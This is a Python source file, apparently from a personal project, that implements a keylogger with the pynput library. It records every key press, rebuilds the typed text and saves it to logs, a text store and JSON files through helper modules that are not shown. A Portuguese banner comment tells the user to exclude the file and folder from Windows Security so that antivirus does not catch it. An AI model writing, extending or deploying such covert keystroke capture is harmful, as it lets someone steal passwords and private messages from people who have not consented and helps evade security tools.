#################################################################################################
# LEMBRE-SE DE ADICIONAR ESSE ARQUIVO E A PASTA DESSE PROJETO EM EXCLUSÃO NO WINDOWS SECURITY
#################################################################################################

# if o pc for windows:
# from pynput.keyboard._win32 import KeyCode

from pynput.keyboard import Listener
from Functions.JSONLib import JSONLib
from Loggers.Logger import Logger
from Loggers.Stacker import Stacker

json = JSONLib()
keyboard = "Keyboard"
logger = Logger(keyboard)
stacker = Stacker(keyboard)

class KeyLogger():

    def __init__(self):
        self.keys = []
        self.text = ""
        
    def __set_keys(self, key: str, **kwargs) -> None:
        self.keys.append(key)
        logger.info(message=f"'{key}'", **kwargs)

    def __set_text(self, text: str) -> None:
        self.text = text
        
    def __get_text(self) -> str:
        return self.text
    
    def __add_in_text(self, txt) -> None:
        self.text += txt
        self.__set_text(self.text)

    def __replace_quotation_marks_and_key_classes(self, key) -> None:
        if '''"'"''' in str(key):
            self.__add_in_text("'")
        if """'"'""" in str(key):
            self.__add_in_text('"')
        if not "Key." in str(key):        
            self.__add_in_text(str(key).replace("'", ""))
    
    def __remove_last_digit_from_text(self) -> None:
        self.__set_text(self.__get_text()[:-1])
            
    def __add_pressed_key_in_list_of_texts(self, key) -> None:
        functions_keys = ["Key.enter", "Key.tab", "Key.esc"]

        if not str(key) in functions_keys:
            # print(str(key) == "Key.space")
            if str(key) == "Key.space":
                self.__add_in_text(" ")
            if str(key) == "Key.backspace":
                self.__remove_last_digit_from_text()
            else:
                self.__replace_quotation_marks_and_key_classes(key)
        if str(key) in functions_keys:
            self.__set_keys(self.__get_text(), text=True)
            self.__set_keys(str(key).replace("Key.", "").upper(), key_press=key, text=False)
            
            json.save_text_data(self.__get_text(), str(key).replace("Key.", "").upper())
            self.text = "" 
        if str(key) == "Key.cmd":
            self.__set_keys("SUPER", key_press=key, text=False)
    
    # def __() -> 
    # Imagine a pessoa usar as teclas para a esquerda
    # e querer deletar uma parte em específico, ou melhor 
    # usar Ctrl + Shift + Left ou Right 
    # / Ctrl + A para zerar o texto;
    # 

    def __on_press(self, key) -> None:
        stacker.store_string_to_txt(key)
        logger.debug(message=f"{key} pressed")
        logger.info(message=f"{key}", key_press=key, text=False)
        self.__add_pressed_key_in_list_of_texts(str(key))
        
    def __on_release(self, key) -> None:
        logger.debug(message=f"{key} released")
        
    def keyboard_listener(self) -> None:    
        with Listener(on_press=self.__on_press, on_release=self.__on_release) as listener:
            listener.join()
            